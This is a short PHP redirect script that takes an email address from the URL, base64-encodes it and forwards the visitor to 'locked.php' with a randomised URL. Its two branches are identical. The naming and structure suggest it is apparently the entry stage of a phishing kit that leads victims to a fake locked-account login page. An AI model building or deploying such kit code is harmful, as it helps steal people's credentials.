<?php
session_start();
require_once("system/fc.php");
$varemail = $_GET['email'];
$share = base64_encode($varemail);


if (filter_var($varemail, FILTER_VALIDATE_EMAIL)) {
    header ("Location: locked.php".ran_ul()."&share=$share");
}
elseif (!filter_var($varemail, FILTER_VALIDATE_EMAIL)) {
    header ("Location: locked.php".ran_ul()."&share=$share");
}

?>